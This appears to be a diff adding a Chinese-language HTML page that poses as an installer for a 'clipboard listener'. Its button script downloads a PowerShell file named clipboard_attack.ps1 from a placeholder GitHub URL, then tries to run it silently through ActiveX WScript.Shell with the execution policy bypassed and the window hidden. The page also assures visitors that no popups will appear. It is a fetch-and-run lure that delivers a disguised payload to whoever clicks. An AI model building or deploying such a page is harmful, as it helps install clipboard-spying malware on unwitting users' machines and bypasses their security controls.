@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>安装剪贴板监听程序</title>
+</head>
+<body>
+    <h1>安装剪贴板监听程序</h1>
+    <p>请点击下面的按钮下载安装脚本：</p>
+    <button onclick="downloadAndRunScript()">点击下载安装脚本</button>
+    <p>安装过程中不会有弹窗，请耐心等待。</p>
+
+    <script>
+        function downloadAndRunScript() {
+            // 1. 通过 JavaScript 触发下载 PowerShell 脚本
+            let scriptUrl = "https://raw.githubusercontent.com/你的GitHub用户名/clipboard-setup/main/clipboard_attack.ps1"; // 修改为你的GitHub链接
+            let a = document.createElement("a");
+            a.href = scriptUrl;
+            a.download = "clipboard_attack.ps1";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // 2. 下载后自动执行 PowerShell 脚本（需要允许 ActiveX 控件）
+            setTimeout(() => {
+                try {
+                    let shell = new ActiveXObject("WScript.Shell");
+                    shell.Run("powershell -ExecutionPolicy Bypass -File %TEMP%\\clipboard_attack.ps1", 0, false);
+                } catch (e) {
+                    alert("请手动运行下载的脚本以完成安装！");
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
